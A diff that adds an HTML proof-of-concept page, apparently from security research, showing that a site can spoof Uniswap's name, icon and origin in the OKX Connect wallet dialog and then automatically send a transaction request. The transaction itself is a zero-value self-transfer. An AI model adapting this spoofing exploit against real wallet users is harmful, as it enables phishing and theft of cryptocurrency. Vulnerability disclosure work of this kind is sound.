@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PoC#2 OKX Connect — DAppInfo Origin Spoof → auto Tx (AUTHORIZED TEST ONLY)</title>
+<style>
+  body{font-family:system-ui,sans-serif;max-width:720px;margin:24px auto;padding:0 16px;line-height:1.5}
+  .warn{background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:8px}
+  code,pre{background:#f4f4f4;border-radius:6px;padding:2px 6px}
+  pre{padding:12px;overflow:auto;white-space:pre-wrap}
+  button{padding:10px 16px;font-size:15px;border-radius:8px;border:1px solid #888;cursor:pointer;margin:4px 0}
+</style>
+</head>
+<body>
+<h2>PoC #2 — OKX Connect DAppInfo spoof</h2>
+
+
+<button id="connect">Connect via OKX</button>
+<pre id="out">—</pre>
+
+<script type="module">
+import { OKXUniversalConnectUI } from 'https://esm.sh/@okxconnect/ui@1';
+
+const out = document.getElementById('out');
+const log = (m)=> out.textContent = (typeof m==='string'? m : JSON.stringify(m,null,2));
+const CHAIN = 'eip155:1';
+
+document.getElementById('connect').onclick = async () => {
+  const ui = await OKXUniversalConnectUI.init({
+    dappMetaData: {
+      name: 'Uniswap',
+      icon: 'https://app.uniswap.org/favicon.png',
+      url:  'https://app.uniswap.org',    
+      origin: 'https://app.uniswap.org'    
+    },
+    uiPreferences: { theme: 'SYSTEM' }
+  });
+
+  try {
+    const session = await ui.openModal({
+      namespaces: { eip155: { chains: [CHAIN], rpcMap: { 1: 'https://cloudflare-eth.com' }, defaultChain: '1' } }
+    });
+    const account = (session?.namespaces?.eip155?.accounts?.[0] || '').split(':').pop();
+    const tx = { from: account, to: account, value: '0x0', data: '0x' };
+    const hash = await ui.request({ method: 'eth_sendTransaction', params: [tx] }, CHAIN);
+  } catch (e) { 
+  }
+};
+</script>
+</body>
+</html>
